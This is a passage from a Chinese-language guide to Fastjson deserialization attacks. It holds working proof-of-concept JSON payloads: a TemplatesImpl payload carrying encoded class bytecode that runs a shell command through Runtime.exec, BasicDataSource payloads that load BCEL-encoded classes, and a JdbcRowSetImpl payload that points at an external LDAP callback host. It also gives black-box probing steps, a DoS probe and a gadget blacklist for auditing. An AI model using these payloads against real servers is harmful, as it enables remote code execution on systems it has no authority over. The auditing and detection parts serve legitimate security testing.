# 最终PoC

```json
{
  "艾特type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY="],
  "_name": "a.b",
  "_tfactory": {},
  "_outputProperties": {},
  "_name": "a",
  "_version": "1.0",
  "allowedProtocols": "all"
}
```

**关键调用链如下**

**命令执行如下**

### 2. 直接反序列化 - DBCP

**依赖**
- `commons-dbcp.jar`
  - `org.apache.commons.dbcp.BasicDataSource`
- `tomcat-dbcp.jar` (Tomcat自带)
  - `org.apache.tomcat.dbcp.dbcp.BasicDataSource`

**运行PoC1得到的结果:**

```plaintext
$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adR$ddj$TA$Y$3d$93$a4$d9d$bbmMc$5bS$ffZ$b5$9az$d1A$f0F$ob$b1$8a$85$d4$96$s$u$d2$ab$c9fLGvg$c2$ecD$82$P$e4$bd7V$U$7c$A$lJ$fcv$8dI$c0$80$V$dce$e6$9b9$7b$ce$f7$bb$df$7f$7c$f9$G$e0$3en$fb$f0$b0$e6$e3$Sj$r$ac$a7$f6$b2$87$x$3e$e6$b0$e6$e1$wC$f1$a1$d2$ca$3db$c8$d7$b7_2$U$9e$98$aedXj$w$z_$M$e2$8e$b4m$d1$89$I$f1$9f$OC$d9w$ca$e8$c4$c35$86$b2$b3B$to$8c$8d$Z$3e$d4$9b$a1$89y2$d0$dc$d8$k$X$7d$R$9eJ$3e$U$91$d0$5ci$t$ad$W$R$l$s$91$L$f9$de$e1Ac$s9$8e$s$d4$ae$8b$f9$5e$fb$60w$a8$92$7d$82$843$f6$ef$a2DZ$r$o$f5$5eZ$de$g$jE$9a$ees$a1$bb$91$b4$8d$b4$3a$fbo$89$9e$fc$87$a0$k$aeSWc$a14$c3j$fd$a4$f9V$bc$T$9c$e2$f5x$cbY$a5$7b$Ze$83$fa$db2$D$h$cag$wmv$e9$c8$84$3b$v3$40$Je$P$9b$Bn$e0$sC$e0$cc$m$3c$dd$e0$$$ee$f3$7b$Bna$8b$e6F$5c$86$c7$e7$ad$cb$O$b4S$b1$e4$bb$9d$84$s$Y$bav$3a$c6H$3a$86j$96$9a2$7c$ffp$3ck$86$H$e7u$fc$db$d1$94$b6$3a$vv$K$adL$d0$e3_$c9P$f5$3d$e9$c6$97$95$fav$f3$PN$83$ba$u$87$92J$bdS$9f$d1$c4$v$e8$c8$9aP$sI$D$9b$f4$93$7bH$9f$CX$daH$e4$e0$d3m$87$y$p$bbx$f7$M$ec3r$cb$f9O$u$bc$faH$I$c3$7c$8a$pO$fb$3c$a9$C$y$d0$h$8c$3c$y$d0Z$c4$S$ed$a9$97Z$86$92f$o$yfn$x$Z$ed$c2$uXJ$cb$cf$a2$ad$8e$fdV$u$b3eTG$82$z$b29$b2$e5$af$98$7b$7d$86bs$o$f4$b3$P5$we$7d$y$beHk$85$ce9$ac$fe$E$i$98$ab$f0$f4$D$A$A
```

最终PoC:

```json
{
  "艾特type": "java.lang.Class",
  "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
}, {
  "艾特type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassLoader": {
    "艾特type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A"
}
```

## 黑白盒测试方法

### 利用链及版本

| Payload | PayloadType | Dependencies |
| --- | --- | --- |
| BasicDataSource | local | tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4 |
| JdbcRowSetImpl | jndi | Fastjson 1.2.47及以下 |
| TemplatesImp | local | need Feature.SupportNonPublicField |

### 黑盒测试

1. **目标站点报错测试**  
   如果目标站点报错，通常可以通过不闭合花括号或添加多余的双引号来进行测试。

2. **Fastjson与Jackson的区别**  
   如果请求包中的JSON如下：
   ```json
   {"name":"S", "age":21}
   ```
   追加一个随机key，修改JSON为：
   ```json
   {"name":"S", "age":21, "agsbdkjada__ss_d":123}
   ```
   - Fastjson不会报错。
   - Jackson由于强制要求key与JavaBean属性对齐，因此会报错。服务器响应中会有异常回显。

3. **DoS检测**  
   发送以下JSON并观察返回时间：
   ```json
   {"a:"\x"}
   ```

4. **JSON字符串中存在反序列化**  
   如果JSON字符串中`name`字段存在反序列化，例如：
   ```json
   {"id":"1","name":"wangwei"}
   ```
   那么PoC可以是：
   ```json
   {
     "id": "1",
     "name": {
       "艾特type": "java.lang.Class",
       "val": "com.sun.rowset.JdbcRowSetImpl"
     },
     "x": {
       "艾特type": "com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName": "ldap://fatjaon.tuq75v.ceye.io",
       "autoCommit": true
     }
   }
   ```

**小贴士**
- 在测试过程中，如果发现回显较慢或感觉卡顿，可能是正在执行命令。
- 使用低版本的Java环境编译`poc.java`文件，因为Java是向下兼容的，防止目标环境加载时报错。建议使用JDK 1.6。

### 白盒审计函数

1. 检查fastjson jar包是否小于1.2.48。
2. 审查以下函数：
   - `JSON.parseObject()`
   - `JSONObject.parseObject()`
   - `JSON.parseArray()`

### 黑名单

- `config.checkAutoType(typeName)`
- `bsh`
- `com.mchange`
- `com.sun.`
- `java.lang.Thread`
- `java.net.Socket`
- `java.rmi`
- `javax.xml`
- `org.apache.bcel`
- `org.apache.commons.beanutils`
- `org.apache.commons.collections.Transformer`
- `org.apache.commons.collections.functors`
- `org.apache.commons.collections4.comparators`
- `org.apache.commons.fileupload`
- `org.apache.myfaces.context.servlet`
- `org.apache.tomcat`
- `org.apache.wicket.util`
- `org.codehaus.groovy.runtime`
- `org.hibernate`
- `org.jboss`
- `org.mozilla.javascript`
- `org.python.core`
- `org.springframework`

**参考链接**
- [https://github.com/c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit)
- [https://github.com/shengqi158/fastjson-remote-code-execute-poc](https://github.com/shengqi158/fastjson-remote-code-execute-poc)
- [https://www.cnblogs.com/hac425/p/9800288.html](https://www.cnblogs.com/hac425/p/9800288.html)
- [https://blog.csdn.net/yaofeino1/article/details/76377080](https://blog.csdn.net/yaofeino1/article/details/76377080)
- [https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/](https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/)
- [https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)